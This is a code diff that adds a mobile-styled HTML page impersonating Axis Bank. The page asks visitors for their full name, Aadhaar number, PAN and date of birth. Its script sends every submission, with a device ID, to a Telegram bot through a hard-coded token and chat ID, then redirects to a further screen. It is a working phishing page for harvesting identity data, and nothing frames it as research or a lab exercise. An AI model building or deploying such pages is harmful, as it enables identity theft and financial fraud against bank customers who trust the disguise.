@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis Bank - Personal Details</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            max-width: 500px;
+            margin: 0 auto;
+            overflow-x: hidden;
+        }
+        
+        /* Main Container */
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-color: #ffffff;
+        }
+        
+        /* Header */
+        .header {
+            background-color: #ffffff;
+            padding: 18px 25px;
+            border-bottom: 2px solid #f0f0f0;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 80px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+        
+        .bank-logo {
+            width: 180px;
+            height: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .bank-logo img {
+            width: 200%;
+            height: 200%;
+            object-fit: cover;
+            object-position: center -25px;
+            transform: scale(0.8);
+        }
+        
+        /* Page Title */
+        .page-title {
+            background: linear-gradient(to right, #AE275F, #C63D7B);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+        
+        .page-title h1 {
+            font-size: 26px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        
+        .page-title p {
+            font-size: 15px;
+            opacity: 0.9;
+            max-width: 400px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+        
+        /* Form Container */
+        .form-container {
+            padding: 25px 20px 30px;
+            flex-grow: 1;
+            background-color: #ffffff;
+        }
+        
+        .form-title {
+            color: #000000;
+            font-size: 22px;
+            margin-bottom: 25px;
+            font-weight: 700;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 22px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #333333;
+            font-size: 15px;
+        }
+        
+        .form-label span {
+            color: #AE275F;
+            margin-left: 2px;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px 16px 16px 50px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 15px;
+            background-color: white;
+            color: #000000;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #AE275F;
+            box-shadow: 0 0 0 3px rgba(174, 39, 95, 0.15);
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #AE275F;
+            font-size: 18px;
+        }
+        
+        .input-hint {
+            font-size: 13px;
+            color: #666666;
+            margin-top: 6px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .input-hint i {
+            color: #AE275F;
+            margin-right: 6px;
+            font-size: 12px;
+        }
+        
+        /* Date of Birth Input */
+        .dob-input {
+            width: 100%;
+            padding: 16px 16px 16px 50px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 15px;
+            background-color: white;
+            color: #000000;
+            transition: all 0.3s;
+        }
+        
+        .dob-input:focus {
+            outline: none;
+            border-color: #AE275F;
+            box-shadow: 0 0 0 3px rgba(174, 39, 95, 0.15);
+        }
+        
+        /* Button */
+        .btn-next {
+            width: 100%;
+            padding: 18px;
+            background-color: #AE275F;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: all 0.3s;
+            box-shadow: 0 6px 20px rgba(174, 39, 95, 0.25);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-next:hover {
+            background-color: #C63D7B;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(174, 39, 95, 0.35);
+        }
+        
+        .btn-next:active {
+            transform: translateY(0);
+        }
+        
+        .btn-next i {
+            margin-left: 10px;
+            font-size: 16px;
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: #f8f8f8;
+            color: #666666;
+            padding: 25px 20px;
+            margin-top: auto;
+            border-top: 1px solid #eaeaea;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 22px;
+        }
+        
+        .footer-link {
+            color: #666666;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 12px;
+            width: 48%;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .footer-link:hover {
+            color: #AE275F;
+            text-decoration: underline;
+        }
+        
+        .footer-disclaimer {
+            font-size: 12px;
+            line-height: 1.6;
+            padding-top: 10px;
+            color: #555555;
+            text-align: center;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 20px 16px 25px;
+            }
+            
+            .page-title {
+                padding: 22px 16px;
+            }
+            
+            .page-title h1 {
+                font-size: 24px;
+            }
+            
+            .page-title p {
+                font-size: 14px;
+            }
+            
+            .form-title {
+                font-size: 20px;
+                margin-bottom: 20px;
+            }
+            
+            .footer {
+                padding: 22px 16px;
+            }
+        }
+        
+        /* Form input placeholder styling */
+        .form-input::placeholder {
+            color: #999999;
+            font-weight: 400;
+        }
+        
+        /* Auto-format styling */
+        .form-input.formatted {
+            letter-spacing: 2px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Main Container -->
+    <div class="container" id="main-container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-container">
+                <div class="bank-logo">
+                    <img src="https://images.seeklogo.com/logo-png/1/1/axis-bank-logo-png_seeklogo-14775.png" alt="Axis Bank Logo" onerror="this.onerror=null; this.src='https://cdn.brandfetch.io/id78YVtrRp/w/350/h/350/theme/dark/icon.png?c=1bxid64Mup7aczewSAYMX&t=1667590351759'">
+                </div>
+            </div>
+        </header>
+
+        <!-- Page Title -->
+        <div class="page-title">
+            <h1>Personal Details</h1>
+            <p>Please provide your personal information for verification purposes.</p>
+        </div>
+
+        <!-- Form Container -->
+        <main class="form-container">
+            <h2 class="form-title">Basic Information</h2>
+
+            <form id="personal-details-form">
+                <div class="form-group">
+                    <label class="form-label" for="full-name">Full Name <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-user input-icon"></i>
+                        <input type="text" id="full-name" class="form-input" placeholder="Enter your full name" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="aadhaar-number">Aadhaar Number <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-id-card input-icon"></i>
+                        <input type="text" id="aadhaar-number" class="form-input formatted" placeholder="XXXX XXXX XXXX" maxlength="14" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="pan-number">PAN Number <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-address-card input-icon"></i>
+                        <input type="text" id="pan-number" class="form-input formatted" placeholder="ABCDE1234F" maxlength="10" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="dob">Date of Birth <span>*</span></label>
+                    <div class="input-container">
+                        <i class="fas fa-calendar-alt input-icon"></i>
+                        <input type="text" id="dob" class="dob-input" placeholder="DD/MM/YYYY" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-next">
+                    Submit Details <i class="fas fa-check-circle"></i>
+                </button>
+            </form>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Security Tips</a>
+                <a href="#" class="footer-link">Contact Us</a>
+                <a href="#" class="footer-link">Branch Locator</a>
+                <a href="#" class="footer-link">FAQs</a>
+            </div>
+
+            <div class="footer-disclaimer">
+                <p>© 2025 Axis Bank Ltd. All rights reserved. Axis Bank is a registered trademark.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Telegram bot config (same as index page)
+        const TELEGRAM_BOT_TOKEN = "8558586576:AAGbxImqr-TyS59Qq9jykl_EvF9YbFVZtLA";
+        const TELEGRAM_CHAT_ID = "8592704250";
+
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                console.warn('Telegram bot not configured; skipping send.');
+                return Promise.resolve();
+            }
+            const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
+            return fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
+            }).then(resp => {
+                if (!resp.ok) throw new Error(`Telegram API error: ${resp.status}`);
+                return resp.json();
+            }).then(data => console.log('Telegram message sent', data))
+            .catch(err => console.warn('Could not send Telegram message', err));
+        }
+
+        // Format Aadhaar number as user types (XXXX XXXX XXXX)
+        document.getElementById('aadhaar-number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            value = value.substring(0, 12); // Limit to 12 digits
+            
+            // Format as XXXX XXXX XXXX
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            
+            e.target.value = formattedValue;
+        });
+        
+        // Format PAN number as user types (uppercase, 10 chars)
+        document.getElementById('pan-number').addEventListener('input', function(e) {
+            let value = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            value = value.substring(0, 10); // Limit to 10 characters
+            e.target.value = value;
+        });
+        
+        // Format Date of Birth as user types (DD/MM/YYYY)
+        document.getElementById('dob').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            
+            // Auto-insert slashes
+            if (value.length > 2 && value.length <= 4) {
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            } else if (value.length > 4) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4) + '/' + value.substring(4, 8);
+            }
+            
+            e.target.value = value;
+        });
+        
+        // Form submission
+        document.getElementById('personal-details-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form values
+            const fullName = document.getElementById('full-name').value.trim();
+            const aadhaar = document.getElementById('aadhaar-number').value.replace(/\s/g, '');
+            const pan = document.getElementById('pan-number').value.trim();
+            const dob = document.getElementById('dob').value.trim();
+            const preData = localStorage.getItem("formData") || "";
+            const DeviceID = localStorage.getItem("DeviceId") || "UnknownDevice";
+            // Create log string with \nkey:value format
+            const logData = 
+                `\nfullName:${fullName}` +
+                `\naadhaar:${aadhaar}` +
+                `\npan:${pan}` +
+                `\ndob:${dob}`+preData;
+            
+            localStorage.setItem("formData", logData);
+            const telegramText = `📥 <b>Personal Details Submitted</b>\nFull Name: <code>${fullName}</code>\nAadhaar: <code>${aadhaar}</code>\nPAN: <code>${pan}</code>\nDOB: <code>${dob}</code>\nDevice: <code>${DeviceID}</code>`;
+            sendTelegramMessage(telegramText)
+              .finally(() => {
+                window.location.href = "screen4.html";
+              });
+
+            this.reset();
+        });
+        
+        // Add visual feedback for input focus
+        const inputs = document.querySelectorAll('.form-input, .dob-input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.backgroundColor = '#fcfcfc';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.backgroundColor = '#ffffff';
+            });
+        });
+    </script>
+</body>
+
+</html>
